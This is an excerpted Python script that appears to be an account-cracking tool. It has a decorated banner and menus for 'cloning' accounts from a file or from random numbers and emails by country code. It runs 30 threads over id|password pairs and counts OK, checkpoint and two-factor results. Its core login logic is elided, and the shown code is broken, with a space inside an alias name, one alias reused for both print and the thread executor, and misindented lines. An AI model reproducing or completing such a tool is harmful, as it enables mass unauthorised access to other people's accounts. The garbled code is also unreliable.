...
from concurrent.futures import ThreadPoolExecutor as Mr_Aw_tricks_sad_boy
import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess
from rich import print as Mr_Aw_tricks_sad_boy
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as Mr_Aw_tricks _sad_boy
    import mechanize
...
\033[1;98m╰━━┻╯╱╰┻╯╱╰━┻━━━╯​​​​
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  AwTricks             ║    
\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚??𝖊 ☪ Mihti Tracker           ║  
...
def main():
    print(BXB)
    mr_Aw_tricks_sad_boy (minx)
    mr_Aw_tricks_sad_boy (' [1] clone from file')
    mr_Aw_tricks_sad_boy (' [2] clone random gmail+number')
    mr_Aw_tricks_sad_boy (' [3] file creating and cute etc Menu')
    mr_Aw_tricks_sad_boy (' [0] exit-program')
    mr_Aw_tricks_sad_boy (minx)
    opt = input(' [+] put:  ')
    if opt =='1':
    	os.system('clear')
    	...
    	os.system('clear')
    	print(RRR);random_crack()
    elif opt =='3':
        os.system('python dump.py')
    elif opt =='0':
        exit("\033[1;92m[+] Good bye")
    else:
        mr_Aw_tricks_sad_boy ('\n Choose valid option ... ');os.system ("clear")
        main()
def random_crack():
    global ok,cp,tf
    mr_Aw_tricks_sad_boy (minx)
    mr_Aw_tricks_sad_boy (' [1] Random Number')
    mr_Aw_tricks_sad_boy (' [2] Random Email ')
    mr_Aw_tricks_sad_boy (' [0] main-menu')
    mr_Aw_tricks_sad_boy (minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        ...
        print(BXB)
        mr_Aw_tricks_sad_boy (minx)
        mr_Aw_tricks_sad_boy (' [+] any country code without + ')
        mr_Aw_tricks_sad_boy (minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(RRR)
        ...
        with mr_Aw_tricks_sad_boy (max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(RRR)
            mr_Aw_tricks_sad_boy(minx)
            mr_Aw_tricks_sad_boy(' [+] Total ids: '+total_ids)            
            mr_Aw_tricks_sad_boy(' [+] Use flight mode for speed')
mr_Aw_tricks_sad_boy(minx)
            for user in fo:
                ids,ps = user.split('|')
        ...
        mr_Aw_tricks_sad_boy(minx)
        mr_Aw_tricks_sad_boy(' The process has completed')
        mr_Aw_tricks_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
...
mr_Aw_tricks_sad_boy (' The process has completed')
        ...
        mr_Aw_tricks_sad_boy('please put correct adress... ')
        time.sleep(1)
        random_crack()
